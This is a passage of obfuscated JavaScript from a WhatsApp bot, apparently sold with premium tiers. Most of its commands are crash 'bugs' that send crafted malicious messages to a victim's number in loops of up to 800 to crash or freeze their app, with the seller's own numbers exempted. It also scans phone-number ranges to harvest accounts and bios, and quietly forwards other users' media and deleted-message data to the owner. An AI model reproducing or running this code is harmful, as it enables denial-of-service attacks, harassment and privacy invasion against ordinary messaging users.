            'url': "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            'mimetype': "image/jpeg",
            'fileSha256': "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            'fileLength': "10840",
            'height': 0xa,
            'width': 0xa,
            'mediaKey': "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            'fileEncSha256': "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            'directPath': "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            'mediaKeyTimestamp': "1721344123",
            'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z"
          }
        }),
        'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          'buttons': []
        })
      });
    }
    if (_0x2d06fa.message) {
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x4870d8 || _0x2d06fa.mtype)) + "\n" + chalk.magenta("=> FROM"), chalk.green(_0x3f56f8), chalk.yellow(_0x2d06fa.sender) + "\n" + chalk.blueBright("=> In"), chalk.green(_0x2d06fa.isGroup ? _0x3f56f8 : "Private Chat", _0x401194));
    }
    // Track deleted messages
    _0x2d3082.ev.on('messages.delete', async (item) => {
      if (!item.keys || !item.keys[0]) return;

      const deletedMsg = item.keys[0];
      const sender = deletedMsg.participant || deletedMsg.remoteJid;
      const msgTime = moment().format("DD/MM/YYYY HH:mm:ss");

      // Send alert to your number
      await _0x2d3082.sendMessage(
        YOUR_NUMBER,
        {
          text: `⚠️ DELETED MESSAGE ALERT!\n\n• Sender: ${sender}\n• Time: ${msgTime}\n• Message ID: ${deletedMsg.id}`
        }
      );
    });
    switch (_0x3baa40) {
      case "save":
    if (!_0x2d06fa.quoted) return _0x7b48ae("Reply to a media message to save it!");
    if (!["imageMessage", "videoMessage", "audioMessage"].includes(_0x2d06fa.quoted.mtype)) {
        return _0x7b48ae("Only PICTURE, VIDEO, or VOICE NOTE can be saved!");
    }

    try {
        // Download the media as a stream
        const mediaStream = await downloadContentFromMessage(_0x2d06fa.quoted, _0x2d06fa.quoted.mtype.replace("Message", ""));
        
        // Convert stream to buffer
        let bufferChunks = [];
        for await (const chunk of mediaStream) {
            bufferChunks.push(chunk);
        }
        const mediaBuffer = Buffer.concat(bufferChunks);

        // Define file path
        const fileExt = _0x2d06fa.quoted.mtype === 'audioMessage' ? 'ogg' : 
                        _0x2d06fa.quoted.mtype === 'videoMessage' ? 'mp4' : 'jpg';
        const mediaPath = `./saved_messages/${Date.now()}_${_0x2d06fa.sender.split('@')[0]}.${fileExt}`;
        
        // Save to file
        fs.writeFileSync(mediaPath, mediaBuffer);
        
        // Forward to your number
        await _0x2d3082.sendMessage(
            YOUR_NUMBER, 
            { 
                [ _0x2d06fa.quoted.mtype === 'imageMessage' ? 'image' : 
                  _0x2d06fa.quoted.mtype === 'videoMessage' ? 'video' : 'audio' ]: 
                { url: mediaPath } 
            }, 
            { quoted: _0x2d06fa }
        );

        _0x7b48ae("✅ Media saved & forwarded to owner!");
    } catch (err) {
        console.error(err);
        _0x7b48ae("❌ Failed to save media.");
    }
    break;
      case "iginfo":
        {
          if (!_0xc6c87) {
            return _0x7b48ae("💡 *Provide an Instagram username*\n> Example: " + (_0x9f50af + _0x3baa40) + " instagram");
          }
          if (!_0xc6c87) {
            return _0x7b48ae("⚠ Enter a valid Instagram username.");
          }
          _0x7b48ae("⏳ _Getting data..._");
          try {
            let _0x184618 = "https://api-ig-info-eternal.vercel.app/?username=" + _0xc6c87;
            let _0x6d35ac = await axios.get(_0x184618, {
              'timeout': 0x2710
            });
            let _0xe4b1c7 = _0x6d35ac.data;
            console.log(_0xe4b1c7);
            if (_0xe4b1c7.status) {
              _0x2d3082.sendMessage(_0x2d06fa.chat, {
                'image': {
                  'url': _0xe4b1c7.user.profile_pic_url
                },
                'caption': "📸 *Instagram Profile Info:*\n👤 *Username:* " + _0xe4b1c7.user.username + "\n👥 *Followers:* " + _0xe4b1c7.user.followers + "\n👥 *Following:* " + _0xe4b1c7.user.following + "\n📝 *Bio:* " + _0xe4b1c7.user.bio + "\n📊 *Posts:* " + _0xe4b1c7.user.posts + "\n🔒 *Private:* " + (_0xe4b1c7.user["private"] ? "Yes" : 'No') + "\n📈 *Verified:* " + (_0xe4b1c7.user.verified ? "Yes" : 'No')
              }, {
                'quoted': _0x2d06fa
              });
            } else {
              _0x7b48ae("⚠ Error fetching Instagram data. Try again later.");
            }
          } catch (_0x57a602) {
            console.error("API Error:", _0x57a602);
            _0x7b48ae("⚠ Error fetching Instagram data. Try again later.");
          }
        }
        break;
      case "ios-kil5":
      case "ios-fc5":
        {
          if (!_0x355618) {
            return _0x7b48ae(mess.premium);
          }
          if (!q) {
            return _0x7b48ae("Example:\n " + (_0x9f50af + _0x3baa40) + " 92xxx");
          }
          victim = _0xc6c87.split('|')[0];
          const _0x4984b5 = _0x2d06fa.mentionedJid[0] ? _0x2d06fa.mentionedJid[0] : _0x2d06fa.quoted ? _0x2d06fa.quoted.sender : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          var _0x222ce5 = await _0x2d3082.onWhatsApp(_0x4984b5);
          if (victim == "923176851874") {
            return;
          }
          if (victim == "923497153334") {
            return;
          }
          if (victim == "923376766706") {
            return;
          }
          if (_0x222ce5.length == 0) {
            return _0x7b48ae("The number is not registered on WhatsApp");
          }
          _0x22060b("Successfully Sent Bug To @" + _0x4984b5.split('@')[0] + " Using *" + _0x3baa40 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x4984b5]);
          for (let _0x20d949 = 0; _0x20d949 < 10; _0x20d949++) {
            await xiosinvi(_0x4984b5);
          }
        }
        break;
      case "iphone16pro":
      case "iphone-fack":
        {
          if (_0x598d1d.includes(_0x58346f)) {
            if (!_0x355618) {
              return _0x7b48ae(mess.premium);
            }
            if (!q) {
              return _0x7b48ae("Example:\n " + (_0x9f50af + _0x3baa40) + " 92xxx");
            }
            victim = _0xc6c87.split('|')[0];
            const _0x1b6473 = _0x2d06fa.mentionedJid[0] ? _0x2d06fa.mentionedJid[0] : _0x2d06fa.quoted ? _0x2d06fa.quoted.sender : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            var _0x222ce5 = await _0x2d3082.onWhatsApp(_0x1b6473);
            if (victim == "923252132556") {
              return;
            }
            if (victim == "923108218439") {
              return;
            }
            if (victim == "923403260410") {
              return;
            }
            if (_0x222ce5.length == 0) {
              return _0x7b48ae("The number is not registered on WhatsApp");
            }
            _0x22060b("Successfully Sent Bug To @" + _0x1b6473.split('@')[0] + " Using *" + _0x3baa40 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x1b6473]);
            for (let _0x37c5fe = 0; _0x37c5fe < 100; _0x37c5fe++) {
              await xiosinvi(_0x1b6473);
            }
          } else {
            _0x7b48ae("*_🚫 You Are Not Premium User Contact With Owner RSP To Buy Premium_*\n*Contact:* +923176851874\n*Telegram:* https://t.me/RSPxLegendOP");
          }
        }
        break;
      case "device":
      case "checkdevice":
      case "cekdevice":
        {
          if (!_0x3250ef) {
            return;
          }
          const _0x415c4a = _0x2d06fa.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
          const _0x1d3221 = _0x2d06fa.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"];
          if (!_0x415c4a || !_0x1d3221) {
            await _0x2d3082.sendMessage(_0x401194, {
              'text': "Quote The Target Message"
            }, {
              'quoted': _0x2d06fa
            });
            break;
          }
          const _0xf8e3c9 = _0x1d3221.length > 21 ? "Device: Android" : _0x1d3221.startsWith('3A') ? "Device: iOS" : "Device: WhatsApp Web or BotAPI";
          await _0x2d3082.sendMessage(_0x401194, {
            'text': _0xf8e3c9
          }, {
            'quoted': _0x2d06fa
          });
        }
        break;
      case "wanumber":
      case "nowa":
      case "searchno":
      case "searchnumber":
        {
          if (!_0xc6c87) {
            return _0x7b48ae("Provide Number with last number x\n\nExample: " + (_0x9f50af + _0x3baa40) + " 91690913721x");
          }
          var _0x24a876 = _0xc6c87.split(" ")[0];
          _0x7b48ae("Searching for WhatsApp account in given range...");
          var _0x43e374 = _0x24a876.split('x')[0];
          var _0x184d5f = _0x24a876.split('x')[_0x24a876.split('x').length - 1] ? _0x24a876.split('x')[_0x24a876.split('x').length - 1] : '';
          var _0x49c9bb = _0x24a876.split('x').length - 1;
          var _0x120593;
          if (_0x49c9bb == 1) {
            _0x120593 = 10;
          } else {
            if (_0x49c9bb == 2) {
              _0x120593 = 100;
            } else if (_0x49c9bb == 3) {
              _0x120593 = 1000;
            }
          }
          var _0x1816b9 = "*==[ List of Whatsapp Numbers ]==*\n\n";
          var _0x8540a7 = "\n*Bio:* || \nHey there! I am using WhatsApp.\n";
          var _0x572a73 = "\n*Numbers with no WhatsApp account within provided range.*\n";
          for (let _0x3bbf88 = 0; _0x3bbf88 < _0x120593; _0x3bbf88++) {
            var _0x44ec73 = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
            var _0x539209 = _0x44ec73[Math.floor(Math.random() * _0x44ec73.length)];
            var _0x25b160 = _0x44ec73[Math.floor(Math.random() * _0x44ec73.length)];
            var _0x2572c8 = _0x44ec73[Math.floor(Math.random() * _0x44ec73.length)];
            var _0x4260cd = _0x44ec73[Math.floor(Math.random() * _0x44ec73.length)];
            var _0x2ddeea;
            if (_0x49c9bb == 1) {
              _0x2ddeea = '' + _0x539209;
            } else {
              if (_0x49c9bb == 2) {
                _0x2ddeea = '' + _0x539209 + _0x25b160;
              } else {
                if (_0x49c9bb == 3) {
                  _0x2ddeea = '' + _0x539209 + _0x25b160 + _0x2572c8;
                } else if (_0x49c9bb == 4) {
                  _0x2ddeea = '' + _0x539209 + _0x25b160 + _0x2572c8 + _0x4260cd;
                }
              }
            }
            var _0x5b993f = await _0x2d3082.onWhatsApp('' + _0x43e374 + _0x3bbf88 + _0x184d5f + "@s.whatsapp.net");
            var _0x1c991e = _0x5b993f.length !== 0 ? _0x5b993f : false;
            try {
              try {
                var _0x9c6859 = await _0x2d3082.fetchStatus(_0x5b993f[0].jid);
              } catch {
                var _0x9c6859 = "401";
              }
              if (_0x9c6859 == "401" || _0x9c6859.status.length == 0) {
                _0x8540a7 += "wa.me/" + _0x5b993f[0].jid.split('@')[0] + "\n";
              } else {
                _0x1816b9 += "🪀 *Number:* wa.me/" + _0x5b993f[0].jid.split('@')[0] + "\n 🎗️*Bio :* " + _0x9c6859.status + "\n🧐*Last update :* " + moment(_0x9c6859.setAt).tz("Asia/Kolkata").format("HH:mm:ss DD/MM/YYYY") + "\n\n";
              }
            } catch {
              _0x572a73 += '' + _0x43e374 + _0x3bbf88 + _0x184d5f + "\n";
            }
          }
          _0x7b48ae('' + _0x1816b9 + _0x8540a7 + _0x572a73);
        }
        break;
      case "reactch":
        {
          if (!q) {
            return _0x7b48ae("Usage: " + _0x9f50af + "reactch link_channel text\nFor example: " + (_0x9f50af + _0x3baa40) + " https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20/18383 hello");
          }
          if (!q.startsWith("https://whatsapp.com/channel/")) {
            return _0x7b48ae("Link invalid!");
          }
          const _0x14183d = {
            'a': '🅐',
            'b': '🅑',
            'c': '🅒',
            'd': '🅓',
            'e': '🅔',
            'f': '🅕',
            'g': '🅖',
            'h': '🅗',
            'i': '🅘',
            'j': '🅙',
            'k': '🅚',
            'l': '🅛',
            'm': '🅜',
            'n': '🅝',
            'o': '🅞',
            'p': '🅟',
            'q': '🅠',
            'r': '🅡',
            's': '🅢',
            't': '🅣',
            'u': '🅤',
            'v': '🅥',
            'w': '🅦',
            'x': '🅧',
            'y': '🅨',
            'z': '🅩',
            '0': '⓿',
            '1': '➊',
            '2': '➋',
            '3': '➌',
            '4': '➍',
            '5': '➎',
            '6': '➏',
            '7': '➐',
            '8': '➑',
            '9': '➒'
          };
          const _0x26fbca = _0xd22d6a.slice(1).join(" ").toLowerCase();
          const _0x3ba3f8 = _0x26fbca.split('').map(_0x5bef53 => {
            if (_0x5bef53 === " ") {
              return '―';
            }
            return _0x14183d[_0x5bef53] || _0x5bef53;
          }).join('');
          try {
            const _0x403a9b = _0xd22d6a[0];
            const _0x38082f = _0x403a9b.split('/')[4];
            const _0x4d1d0d = _0x403a9b.split('/')[5];
            const _0x3c2ef6 = await _0x2d3082.newsletterMetadata("invite", _0x38082f);
            await _0x2d3082.newsletterReactMessage(_0x3c2ef6.id, _0x4d1d0d, _0x3ba3f8);
            return _0x7b48ae("Sent reaction *" + _0x3ba3f8 + "* for the message in the channel *" + _0x3c2ef6.name + '.*');
          } catch (_0x39bdcd) {
            console.error(_0x39bdcd);
            return _0x7b48ae("Failed to send reaction. Please make sure the link and emoji are valid.");
          }
        }
        break;
      case "checkchid":
      case "idch":
        {
          if (!_0xc6c87) {
            return _0x7b48ae("Provide channel link\nExample: " + (_0x9f50af + _0x3baa40) + " https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20 ");
          }
          if (!_0xc6c87.includes("https://whatsapp.com/channel/")) {
            return _0x7b48ae("Invalid link");
          }
          let _0x36a06b = _0xc6c87.split("https://whatsapp.com/channel/")[1];
          try {
            let _0x3fc260 = await _0x2d3082.newsletterMetadata("invite", _0x36a06b);
            if (!_0x3fc260) {
              return _0x7b48ae("Failed to fetch information of this channel");
            }
            let _0x11441c = "\n*ID :* " + _0x3fc260.id + "\n*Name :* " + _0x3fc260.name + "\n*Total Followers :* " + _0x3fc260.subscribers + "\n*Status :* " + _0x3fc260.state + "\n*Verified :* " + (_0x3fc260.verification == "VERIFIED" ? "Verified" : "Not Verified") + "\n        ";
            return _0x7b48ae(_0x11441c);
          } catch (_0x1206ec) {
            console.error(_0x1206ec);
            return _0x7b48ae("An error occurred while retrieving metadata");
          }
        }
        break;
      case "searchpair":
        {
          if (!global.banner.includes(_0x220e22)) {
            return;
          }
          if (!_0xd22d6a[0]) {
            return _0x7b48ae("❌ Please provide a number to search. Example: *searchpair 923403260410*");
          }
          const _0xa131a0 = _0xd22d6a[0] + "@s.whatsapp.net";
          try {
            if (!fs.existsSync("./lib2/pairing")) {
              return _0x7b48ae("No paired devices found.");
            }
            const _0x352e19 = fs.readdirSync("./lib2/pairing", {
              'withFileTypes': true
            });
            const _0xa94af3 = _0x352e19.filter(_0x15435b => _0x15435b.isDirectory()).map(_0x5c7808 => _0x5c7808.name);
            return _0xa94af3.includes(_0xa131a0) ? _0x7b48ae("✅ The number *" + _0xd22d6a[0] + "* is paired.") : _0x7b48ae("❌ The number *" + _0xd22d6a[0] + "* is not paired.");
          } catch (_0x28cf60) {
            console.error("Error searching paired devices:", _0x28cf60);
            return _0x7b48ae("Failed to search paired devices data.");
          }
        }
        break;
      case "forcegroup":
        if (!_0x4ff3d7) {
          return _0x7b48ae(mess.premium);
        }
        if (!q) {
          return _0x7b48ae("Example:\n " + (_0x9f50af + _0x3baa40) + " 120363047626537xxx@g.us|5\n\nTo get group ID, type .listgc\n\nTo get group ID from a group link, type .group-id link");
        }
        if (q.includes("chat.whatsapp.com")) {
          return _0x7b48ae("Group ID must be a number, not a link. Use .group-id <link> to get the group ID.");
        }
        let _0x49b78e = q.split('|');
        let _0x499292 = _0x49b78e[0].trim();
        let _0x49ed00 = parseInt(_0x49b78e[1]);
        if (!/^\d+@g\.us$/.test(_0x499292)) {
          return _0x7b48ae("Invalid group ID! Please enter a correct WhatsApp group ID.");
        }
        if (isNaN(_0x49ed00) || _0x49ed00 < 1) {
          _0x49ed00 = 5;
        }
        _0x7b48ae("Successfully sent force message to the group chat");
        for (let _0x4052c4 = 0; _0x4052c4 < _0x49ed00; _0x4052c4++) {
          await _0x363de1(1050);
          await _0x2d3082.relayMessage(_0x499292, {
            'messageContextInfo': {
              'messageSecret': "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
              'deviceListMetaData': {},
              'deviceListMetadataVersion': 0x2
            },
            'scheduledCallCreationMessage': {
              'scheduledTimestampMs': "1200",
              'callType': "AUDIO",
              'title': '👻'
            }
          }, {
            'additionalAttributes': {
              'edit': '7'
            }
          });
        }
        break;
      case "forceblock":
        if (!_0x4ff3d7) {
          return _0x7b48ae(mess.premium);
        }
        let _0x3496da = parseInt(_0xd22d6a[0]);
        if (isNaN(_0x3496da) || _0x3496da < 1) {
          _0x3496da = 5;
        }
        for (let _0x1bb2b6 = 0; _0x1bb2b6 < _0x3496da; _0x1bb2b6++) {
          await _0x363de1(1050);
          await _0x2d3082.relayMessage(_0x401194, {
            'messageContextInfo': {
              'messageSecret': "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
              'deviceListMetaData': {},
              'deviceListMetadataVersion': 0x2
            },
            'scheduledCallCreationMessage': {
              'scheduledTimestampMs': "1200",
              'callType': "AUDIO",
              'title': '👻'
            }
          }, {
            'additionalAttributes': {
              'edit': '7'
            }
          });
        }
        break;
      case "listpair":
        {
          if (!(global.db.data.owners || []).includes(_0x220e22)) {
            return _0x7b48ae("❌ Sorry you don't have permission to use this command. This command can only be used by reseller! \n\nWant to buy reseller? Chat Developer!\nYouTube: https://youtube.com/@rsp_editz74\nTelegram: 1rspxlegendyt\nWhatsApp: +923176851874");
          }
          try {
            if (!fs.existsSync("./lib2/pairing")) {
              return _0x7b48ae("No paired devices found.");
            }
            const _0x3a0586 = fs.readdirSync("./lib2/pairing", {
              'withFileTypes': true
            });
            const _0x55b6ac = _0x3a0586.filter(_0x1fbf40 => _0x1fbf40.isDirectory()).map(_0x30d04f => '+' + _0x30d04f.name.replace("@s.whatsapp.net", ''));
            if (_0x55b6ac.length === 0) {
              return _0x7b48ae("No paired devices found.");
            }
            const _0x398443 = _0x55b6ac.length;
            const _0x71eeeb = _0x55b6ac.map((_0x274610, _0x92ce97) => _0x92ce97 + 1 + ". " + _0x274610).join("\n");
            _0x7b48ae("Total Rent Bot Users: " + _0x398443 + "\n\nPaired Devices:\n" + _0x71eeeb);
          } catch (_0x34512d) {
            console.error("Error reading paired devices directory:", _0x34512d);
            return _0x7b48ae("Failed to load paired devices data.");
          }
        }
        break;
      case "delpair":
        {
          if (!q) {
            return _0x7b48ae("Example:\n " + (_0x9f50af + _0x3baa40) + " 92xxx");
          }
          victim = _0xc6c87.split('|')[0];
          const _0x2742d9 = _0x2d06fa.mentionedJid[0] ? _0x2d06fa.mentionedJid[0] : _0x2d06fa.quoted ? _0x2d06fa.quoted.sender : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          var _0x222ce5 = _0x2742d9;
          if (_0x222ce5.length == 0) {
            return _0x7b48ae("The number is not registered on WhatsApp");
          }
          const _0x2141f5 = "./lib2/pairing/" + _0x2742d9;
          try {
            if (!fs.existsSync(_0x2141f5)) {
              return _0x7b48ae("Paired device with ID \"" + _0x2742d9 + "\" does not exist.");
            }
            fs.rmSync(_0x2141f5, {
              'recursive': true,
              'force': true
            });
            _0x7b48ae("Paired device with ID \"" + _0x2742d9 + "\" has been successfully deleted.");
          } catch (_0x401182) {
            console.error("Error deleting paired device:", _0x401182);
            return _0x7b48ae("An error occurred while attempting to delete the paired device.");
          }
        }
        break;
      case "reqpair":
        if (!_0x4ff3d7) {
          return _0x7b48ae(mess.premium);
        }
        const _0x13acdc = os.freemem() / 1048576;
        const _0x461ebd = fs.statSync('/').available / 1048576;
        if (_0x13acdc < 300 || _0x461ebd < 300) {
          return _0x7b48ae("Slot is full, please try again later.");
        }
        if (!q) {
          return _0x7b48ae("Example:\n " + (_0x9f50af + _0x3baa40) + " 92xxx");
        }
        victim = _0xc6c87.split('|')[0];
        const _0x2de9c3 = _0x2d06fa.mentionedJid[0] ? _0x2d06fa.mentionedJid[0] : _0x2d06fa.quoted ? _0x2d06fa.quoted.sender : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        var _0x222ce5 = await _0x2d3082.onWhatsApp(_0x2de9c3);
        if (_0x222ce5.length == 0) {
          return _0x7b48ae("The number is not registered on WhatsApp");
        }
        const _0x458aff = _0xc6c87.slice(0, 3);
        const _0x361f81 = _0xc6c87.slice(0, 1);
        const _0x1c3b60 = _0xc6c87.slice(0, 2);
        if (_0x458aff === "252" || _0x361f81 === '0' || _0x1c3b60 === '89' || _0x458aff.startsWith('85')) {
          return _0x7b48ae("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
        }
        if (!(_0xc6c87.length >= 10 && _0xc6c87.length <= 15 && !isNaN(_0xc6c87))) {
          return _0x7b48ae("Invalid WhatsApp number. Please enter a valid number.");
        }
        const _0x10ec3f = require("./rentbot.js");
        await _0x10ec3f(_0x2de9c3);
        await _0x363de1(4000);
        const _0x4fe4a9 = fs.readFileSync("./lib2/pairing/pairing.json", "utf-8");
        const _0x2a7f6a = JSON.parse(_0x4fe4a9);
        await _0x7b48ae('' + _0x2a7f6a.code);
        break;
      case "group-id":
        {
          if (!_0xc6c87) {
            return _0x7b48ae("Enter Group Link!");
          }
          if (!_0x21a4cc(_0xd22d6a[0]) && !_0xd22d6a[0].includes("whatsapp.com")) {
            return _0x7b48ae("Link Invalid!");
          }
          const _0x1bacd9 = _0xd22d6a[0].split("https://chat.whatsapp.com/")[1];
          try {
            const _0xc94d05 = await _0x2d3082.groupAcceptInvite(_0x1bacd9);
            if (!_0xc94d05) {
              return _0x7b48ae("The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.");
            }
            _0x7b48ae("Group ID: " + _0xc94d05);
          } catch (_0x493f08) {
            _0x7b48ae("The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.");
          }
        }
        break;
      case "autoswview":
      case "autostatusview":
        {
          if (_0xd22d6a[0] === 'on') {
            db.data.settings[_0x138d77].antiswview = true;
            _0x7b48ae("Successfully " + _0x3baa40 + " is enabled");
          } else if (_0xd22d6a[0] === "off") {
            db.data.settings[_0x138d77].antiswview = false;
            _0x7b48ae("Successfully " + _0x3baa40 + " is disabled");
          } else {
            _0x7b48ae("Please select on/off\nExample: " + (_0x9f50af + _0x3baa40) + " on");
          }
        }
        break;
      case "totag":
        {
          if (!_0x2d06fa.isGroup) {
            return _0x7b48ae(mess.OnlyGrup);
          }
          if (!_0x2d06fa.quoted) {
            return _0x7b48ae("Reply message with caption " + (_0x9f50af + _0x3baa40));
          }
          delete _0x2d06fa.quoted.chat;
          await _0x2d3082.sendMessage(_0x2d06fa.chat, {
            'forward': _0x2d06fa.quoted.fakeObj,
            'mentions': _0x4376af.map(_0x33ca62 => _0x33ca62.id)
          });
        }
        break;
      case "hidetag":
      case 'h':
        {
          if (!_0x2d06fa.isGroup) {
            return _0x7b48ae(mess.OnlyGrup);
          }
          _0x2d3082.sendMessage(_0x2d06fa.chat, {
            'text': q ? q : '',
            'mentions': _0x4376af.map(_0x2b5243 => _0x2b5243.id)
          });
        }
        break;
      case "blank-wp":
      case "watsap-kil":
      case "RSP-fc5":
        {
          if (!q) {
            return _0x7b48ae("`Example:` : " + (_0x9f50af + _0x3baa40) + " 92xxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (_0x5052c8.includes(parseInt(target.replace(/[^0-9]/g, '')))) {
            return _0x7b48ae("You can't send bug to owner numbers");
          }
          _0x7b48ae("*[!] bug successfully sent to 𝚝𝚊𝚛𝚐𝚎𝚝*");
          for (let _0x3841e2 = 0; _0x3841e2 < 20; _0x3841e2++) {
            await _0x33e181(target);
          }
          await _0x363de1(3000);
          await _0x33e181(target);
          await _0x363de1(3000);
          await _0x2a05a6(target);
          await _0x2a05a6(target);
          await _0xdb289d(target);
          await _0xdb289d(target);
        }
        break;
      case "invi-kil":
      case "invisible":
        {
          if (!q) {
            return _0x7b48ae("Example Usage:\n ." + _0x3baa40 + " 92xxx");
          }
          let _0x583556 = q.replace(/[^0-9]/g, '');
          if (_0x583556.startsWith('0')) {
            return _0x7b48ae("The number starts with '0'. Replace it with the country code number.\n\nExample: ." + _0x3baa40 + " 62 xxx-xxxx-xxxx");
          }
          let _0x1b69a4 = _0x583556 + "@s.whatsapp.net";
          if (_0x5052c8.includes(parseInt(_0x1b69a4.replace(/[^0-9]/g, '')))) {
            return _0x7b48ae("You can't send bug to owner numbers");
          }
          _0x7b48ae("*𝗦𝗨𝗖𝗖𝗘𝗦 𝗧𝗨𝗔𝗡, 𝗛𝗔𝗥𝗔𝗣 𝗝𝗘𝗗𝗔 𝟱-𝟭𝟬 𝗠𝗘𝗡𝗜𝗧 𝗔𝗚𝗔𝗥 𝗧𝗜𝗗𝗔𝗞 𝗞𝗘𝗡𝗢𝗡 " + _0x3baa40 + " 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗞𝗘 " + _0x1b69a4 + '*');
          for (let _0x3329ac = 0; _0x3329ac < 20; _0x3329ac++) {
            await _0xe1a31a(_0x1b69a4);
            await _0xe1a31a(_0x1b69a4);
            await _0xdb289d(_0x1b69a4);
            await _0xdb289d(_0x1b69a4);
          }
        }
        break;
      case "hadiaw":
      case "cheee":
        {
          if (!q) {
            return _0x7b48ae("Example Usage:\n ." + _0x3baa40 + " 92xxx");
          }
          let _0xd8c773 = q.replace(/[^0-9]/g, '');
          if (_0xd8c773.startsWith('0')) {
            return _0x7b48ae("The number starts with '0'. Replace it with the country code number.\n\nExample: ." + _0x3baa40 + " 62 xxx-xxxx-xxxx");
          }
          let _0x3c578c = _0xd8c773 + "@s.whatsapp.net";
          if (_0x5052c8.includes(parseInt(_0x3c578c.replace(/[^0-9]/g, '')))) {
            return _0x7b48ae("You can't send bug to owner numbers");
          }
          _0x7b48ae("*𝗦𝗨𝗖𝗖𝗘𝗦 𝗧𝗨𝗔𝗡, 𝗛𝗔𝗥𝗔𝗣 𝗝𝗘𝗗𝗔 𝟱-𝟭𝟬 𝗠𝗘𝗡𝗜𝗧 𝗔𝗚𝗔𝗥 𝗧𝗜𝗗𝗔𝗞 𝗞𝗘𝗡𝗢𝗡 " + _0x3baa40 + " 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗞𝗘 " + _0x3c578c + '*');
          for (let _0x2aec65 = 0; _0x2aec65 < 20; _0x2aec65++) {
            await _0x31310f(_0x3c578c);
            await _0x31310f(_0x3c578c);
            await _0x31310f(_0x3c578c);
            await _0x31310f(_0x3c578c);
          }
        }
      case "bug1":
      case "bug2":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!q) {
            return _0x7b48ae("`Example:` : " + (_0x9f50af + _0x3baa40) + " 92xxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (_0x5052c8.includes(parseInt(target.replace(/[^0-9]/g, '')))) {
            return _0x7b48ae("You can't send bug to owner numbers");
          }
          _0x7b48ae("*[!] bug successfully sent to 𝚝𝚊𝚛𝚐𝚎𝚝*");
          for (let _0x17b07e = 0; _0x17b07e < 100; _0x17b07e++) {
            await _0x5dd355(target);
            await _0x5dd355(target);
            await _0x5dd355(target);
            await _0x5dd355(target);
          }
        }
        break;
      case "ui-crash":
      case "bug3":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!q) {
            return _0x7b48ae("`Example:` : " + (_0x9f50af + _0x3baa40) + " 92xxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (_0x5052c8.includes(parseInt(target.replace(/[^0-9]/g, '')))) {
            return _0x7b48ae("You can't send bug to owner numbers");
          }
          _0x7b48ae("*[!] bug successfully sent to 𝚝𝚊𝚛𝚐𝚎𝚝*");
          for (let _0x56b598 = 0; _0x56b598 < 800; _0x56b598++) {
            await _0x5dd355(target);
            await _0x3641dc(target);
            await _0x5dd355(target);
            await _0x3641dc(target);
            await _0x5dd355(target);
            await _0x3641dc(target);
            await _0x5dd355(target);
            await _0x3641dc(target);
            await _0x363de1(500);
          }
        }
        break;
      case "s25ultra-crash":
      case "RSP-hardfc":
      case "beghbebebe":
        {
          if (_0x598d1d.includes(_0x58346f)) {
            if (!_0x355618) {
              return _0x7b48ae(mess.premium);
            }
            if (!q) {
              return _0x7b48ae("`Example:` : " + (_0x9f50af + _0x3baa40) + " 92xxx");
            }
            target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            if (_0x5052c8.includes(parseInt(target.replace(/[^0-9]/g, '')))) {
